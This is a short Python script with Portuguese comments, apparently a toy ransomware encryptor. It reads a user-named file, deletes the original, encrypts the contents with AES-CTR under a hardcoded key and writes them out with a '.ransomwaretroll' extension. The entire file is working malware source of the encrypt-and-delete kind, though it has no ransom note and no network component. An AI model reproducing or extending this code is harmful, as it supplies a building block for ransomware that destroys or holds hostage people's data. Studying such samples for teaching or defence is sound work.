import os
import pyaes

## abrir o aruivo a ser criptografado

file_name = input("Digite o nome do arquivo: ")
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptacao
key = b"0123456789abcdef"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()